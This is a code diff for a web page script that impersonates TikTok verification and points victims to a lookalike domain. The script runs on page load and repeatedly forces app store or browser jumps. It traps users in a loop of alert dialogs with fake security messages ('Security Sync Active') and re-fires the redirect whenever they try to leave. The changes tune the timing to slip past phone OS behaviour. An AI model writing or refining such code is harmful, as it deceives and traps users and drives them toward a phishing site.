@@ -9,50 +9,52 @@
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 6000; // Increased to 6s to allow the "staircase" to work
-    let gap = 400; // Starting with a slightly larger base gap
+    const killTime = Date.now() + 10000; // ATOMIC FAIL-SAFE: 10 SECONDS
+    const fixedGap = 400; // LOCKED DELAY
 
     function triggerStoreJump() {
         const urlEnc = encodeURIComponent(target);
-        // Using the App Store search that confirmed success
+        const isAndroid = /Android/i.test(navigator.userAgent);
+        
+        // Using the App Store search string that is confirmed working
         const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
         const androidTrigger = "market://search?q=" + urlEnc;
         
-        const isAndroid = /Android/i.test(navigator.userAgent);
         window.location.href = isAndroid ? androidTrigger : iosTrigger;
     }
 
     function rampage() {
+        // FAIL-SAFE CHECK
         if (Date.now() > killTime) return;
 
-        // 1. Priming jump
+        // 1. Initial jump attempt
         triggerStoreJump();
 
         // 2. THE LOCK
-        alert("ATTEMPT #27\n\nFinalizing secure connection...\n\nTap OK to open in your browser.");
+        alert("ATTEMPT #28\n\nSecurity Sync Active.\n\nTap OK to finalize handover.");
 
-        // 3. THE PULSE: Fire immediately after tap
-        triggerStoreJump();
-
-        // 4. THE STAIRCASE: Increase the gap by 50ms each time to find the "Sweet Spot"
+        // 3. THE PRECISION WINDOW (400ms)
+        // This is the gap where you confirmed the OS successfully jumps
         setTimeout(() => {
+            // Fire again right before the next alert to keep the 'Intent' fresh
+            triggerStoreJump();
+            
             if (Date.now() < killTime) {
-                // Secondary pulse halfway through the gap
-                triggerStoreJump();
-                
-                setTimeout(() => {
-                    gap += 50; 
-                    rampage();
-                }, gap / 2);
+                rampage();
             }
-        }, 150); 
+        }, fixedGap); 
     }
 
     window.onload = () => {
+        // Start the engine
         rampage();
     };
 
-    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
+    // Keep the jump alive if they try to swipe or minimize
+    window.onblur = () => { 
+        if (Date.now() < killTime) triggerStoreJump(); 
+    };
 </script>
+
 </body>
 </html>
